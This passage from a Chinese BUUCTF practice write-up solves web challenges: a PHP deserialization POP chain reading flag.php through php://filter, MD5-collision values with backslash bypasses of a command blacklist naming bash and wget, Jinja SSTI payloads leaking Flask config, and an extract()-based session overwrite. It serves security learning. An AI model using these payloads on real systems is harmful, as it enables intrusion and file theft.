<li>反序列化利用思路：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tex">利用点在于Modifier的<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>invoke()函数，只有在类实例被当做函数执行时用<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>invoke函数&lt;=<br>Test类中的<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>get方法会调用调用函数，只有在访问不存在的属性或不可访问属性时会调用&lt;=<br>Show类中的<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>toString方法可以将this-&gt;str赋值为Test类实例，可以访问不存在的属性，<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>toString方法只有在类实例被作为字符串或者与字符串拼接时会调用&lt;=<br>Show类的<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>construct方法将字符串与this-&gt;source拼接，可以将this-&gt;source赋值为Show对象<br><span class="hljs-comment">%实现反序列化利用</span><br></code></pre></td></tr></table></figure>
<ol start="3">
<li>构造反序列化字符串代码如下：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Modifier</span>();<br><br><br><span class="hljs-variable">$t</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$t</span>-&gt;p = <span class="hljs-variable">$c</span>;         <span class="hljs-comment">//4.调用Modifier的__invoke方法</span><br><br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$b</span>-&gt;str = <span class="hljs-variable">$t</span>;       <span class="hljs-comment">//3.调用Test的__get方法</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();    <span class="hljs-comment">//1.调用Show的__consrtuct方法</span><br><span class="hljs-variable">$a</span>-&gt;source = <span class="hljs-variable">$b</span>;    <span class="hljs-comment">//2.调用Show的__toString方法</span><br><span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>注意点：</p>
<p>include使用filter协议带出文件内容；</p>
<p>输出的var值为protected属性，需要在变量名前面添加<code>%00*%00</code>。</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;<span class="hljs-comment">%00*%00var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="MRCTF2020-PYWebsite">[MRCTF2020]PYWebsite</h2>
<ol>
<li>查看源码：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747795895654.png" srcset="/img/loading.gif" lazyload alt="1747795895654"></p>
<ol start="2">
<li>直接访问/flag.php页面：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747796470371.png" srcset="/img/loading.gif" lazyload alt="1747796470371"></p>
<ol start="3">
<li>提示<code>我自己</code>,修改包：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747796574757.png" srcset="/img/loading.gif" lazyload alt="1747796574757"></p>
<h2 id="安洵杯-2019-easy-web">[安洵杯 2019]easy_web</h2>
<ol>
<li>查看URL，传递img和cmd两个参数，img值的格式类似于base64编码，进行解码（base64编码后字节数是4的倍数，不足4的倍数后面需要补=等于号），解码具体过程如下：</li>
</ol>
<p>base64解码=&gt;base64解码=&gt;16进制解码</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747820717011.png" srcset="/img/loading.gif" lazyload alt="1747820717011"></p>
<ol start="2">
<li>我们查看index.php源码文件，传入以上逆过程的编码：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747820866123.png" srcset="/img/loading.gif" lazyload alt="1747820866123"></p>
<p>发包：后进行解码</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747820971138.png" srcset="/img/loading.gif" lazyload alt="1747820971138"></p>
<ol start="3">
<li>源码如下：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>第一个问题：md5强类型比较，本来可以传入数组解决，但这里进行强制类型转换为字符串，可以采用以下的例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs url">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2<br>&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<br><br>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2<br>&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<br></code></pre></td></tr></table></figure>
<p>代码执行绕过：</p>
<p>过滤：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)<br></code></pre></td></tr></table></figure>
<p>这里对cmd的参数的关键字进行了正则匹配过滤，因为<code>|\\|\\\\|</code>只对双斜杠和四斜杠进行了过滤，正则中<code>\\\</code>才相当于一个<code>\</code>，对于<code>preg_match</code>这个函数可以通过单反斜杠<code>\</code>进行绕过，也就是说可以采用以下方式进行绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">ls  -&gt; l\s<br>cat -&gt; ca\t<br></code></pre></td></tr></table></figure>
<p>cmd的值如下：</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>l\s%<span class="hljs-number">20</span>/<br><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>c\at%<span class="hljs-number">20</span>/flag<br></code></pre></td></tr></table></figure>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747823292182.png" srcset="/img/loading.gif" lazyload alt="1747823292182"></p>
<h2 id="WesternCTF2018-shrine">[WesternCTF2018]shrine</h2>
<ol>
<li>题目源码如下：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> os<br><br>app = flask.Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shrine</span>(<span class="hljs-params">shrine</span>):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_jinja</span>(<span class="hljs-params">s</span>):<br>        s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) + s<br><br>    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>
<p>代码解释：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%flag的值存在config对象中</span><br><br><span class="hljs-comment">%s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)：</span><br>替换()为空<br><br><span class="hljs-comment">%return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s：</span><br>在渲染s时，将黑名单中的config和self赋值为空；<br>如果没有黑名单的时候，我们可以使用config，传入 config，或者使用self，传入 &#123;&#123;self.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>dict<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>&#125;&#125;；<br>但该步被赋值为空，无法通过该对象访问<br></code></pre></td></tr></table></figure>
<ol start="2">
<li>使用url_for和get_flashed_messages访问，这两个函数包含了current_app全局变量（包含config对象）：</li>
</ol>
<ul>
<li>url_for：</li>
</ul>
<p>查看全局变量，存在current_app：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">/shrine/&#123;&#123;url<span class="hljs-built_in">_</span>for.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>globals<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>&#125;&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747890547729.png" srcset="/img/loading.gif" lazyload alt="1747890547729"></p>
<p>访问current_app的config对象：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">/shrine/&#123;&#123;url<span class="hljs-built_in">_</span>for.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>globals<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>[&#x27;current<span class="hljs-built_in">_</span>app&#x27;].config&#125;&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747890511330.png" srcset="/img/loading.gif" lazyload alt="1747890511330"></p>
<ul>
<li>get_flashed_messages：同理</li>
</ul>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">/shrine/&#123;&#123;get<span class="hljs-built_in">_</span>flashed<span class="hljs-built_in">_</span>messages.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>globals<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>[&#x27;current<span class="hljs-built_in">_</span>app&#x27;].config&#125;&#125;<br></code></pre></td></tr></table></figure>
<h2 id="安洵杯-2019-easy-serialize-php">[安洵杯 2019]easy_serialize_php</h2>
<ol>
<li>题目源码如下：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><br><span class="hljs-variable">$serialize_info</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure>
<ol start="2">
<li>利用入口：$_SESSION的构造传入</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#利用主要代码</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);      <br><span class="hljs-comment">#根据extract()我们可以进行变量覆盖，</span><br><span class="hljs-comment">#当我们POST传入SESSION[flag]=123时，$SESSION[&quot;user&quot;]和$SESSION[‘function‘] 全部会消失。</span><br><span class="hljs-comment">#只剩下_SESSION[flag]=123。</span><br></code></pre></td></tr></table></figure>
<ol start="3">
<li>传入$_SESSION的后续处理流程：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><br><span class="hljs-variable">$serialize_info</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>))<br>    <br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;    <br><br><span class="hljs-comment">#会在我们传入的$_SESSION后额外添加一个img属性</span><br><span 